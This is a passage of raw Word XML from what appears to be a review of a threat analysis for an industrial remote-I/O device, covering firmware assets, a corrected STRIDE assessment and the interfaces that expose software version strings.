            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId135" w:history="1">
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="698D1A79" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B4077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799"/>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="285B84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3D7B22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A9A5C4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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077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48FE96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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Verdict</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="009B0AAA" w14:paraId="54468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DDCED" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="009B0AAA" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Asset D – host FW, SCPU FW, bootloaders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16881" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B407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31918" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="009B0AAA" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Correct and complete for the </w:t>
            </w:r>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>identified software</w:t>
            </w:r>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="009B0AAA" w14:paraId="1C9A2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CBFC2" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="009B0AAA" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:del w:id="18" w:author="Unknown">
              <w:r w:rsidRPr="009B0AAA">
                <w:rPr>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:delText>Asset F – Domain separation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54DF8" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077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CEA6E" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="009B0AAA" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Dropped as primary.</w:t>
            </w:r>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> The domain-crossing mattered only to the identity-integrity concern now at RQ-005. Optional one-line note (SCPU versions relayed by the non-safety COM), not a primary asset here.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="61F46C88" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="005B4077">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">STRIDE — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>corrected</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78F4822F" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Information Disclosure (primary).</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The observable </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>behaviour</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of RQ-006 is </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>emitting an installed-software list</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; the always-present threat is </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>version reconnaissance → CVE mapping</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve">This </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>is</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>your</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve"> own "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>secondary</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve">" </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>correctly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>elevated</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>to</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>primary</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57332AAD" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:del w:id="19" w:author="Unknown">
        <w:r w:rsidRPr="009B0AAA">
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Spoofing / Tampering of the inventory</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Cross-referenced to RQ-005</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (protection of identified software). </w:t>
      </w:r>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve">Not a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>primary</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve"> RQ-006 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>threat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60F91460" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B4077">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">1.3 Security </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Functions</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> &amp; Gaps — Cross-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Referenced</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4E8F856F" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="009B0AAA" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Installed-software identification surface</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (software only — no data fingerprint, correct for RQ-006):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1853"/>
        <w:gridCol w:w="3426"/>
      </w:tblGrid>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="3C3B05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FED601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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077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64C6AC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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Documentation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077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2673F2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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Identifies</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="58F94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8F9AE" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>deviceinfo</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>swrevision</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>, /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>swinfo</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>/{</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>cpubootloader</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>scpu</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>scpubootloader</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>}</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>version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F5396" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t>SRIO-2946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6975B" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">Host FW + SCPU FW + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>both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bootloaders</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> (Asset D) — </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>your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list</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId136" w:history="1">
              <w:r w:rsidRPr="005B4077">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="005B4077">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="005B4077">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="68CE0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15B697" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t>I&amp;M0 SOFTWARE_REVISION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AA1FD" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t>SRIO-3002/3015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52660" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">Firmware </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>revision</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> (Asset D) — </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>your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list</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId137" w:history="1">
              <w:r w:rsidRPr="005B4077">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="005B4077">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="005B4077">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="72D9E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08A1C" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">I&amp;M5 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>annotation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> ("host_fw_1.0.3.215")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F37FA" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t>SRIO-3023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34990" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">Host FW </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>string</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> — </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>your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list</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId138" w:history="1">
              <w:r w:rsidRPr="005B4077">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="005B4077">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="005B4077">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="2D9E3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A24A1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lastRenderedPageBreak/>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>firmware</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>version</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>, /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>firmware</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>/type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BF84D" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t>SRIO-2953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16436" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">Update-container </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>firmware</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> (Asset D) — </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId139" w:history="1">
              <w:r w:rsidRPr="005B4077">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="005B4077">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="005B4077">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="009B0AAA" w14:paraId="3B640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307A1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/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>fieldbussetup</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>fieldbusfirmware</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> ("3.3.0.12 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> IO Device)")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2876CA" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
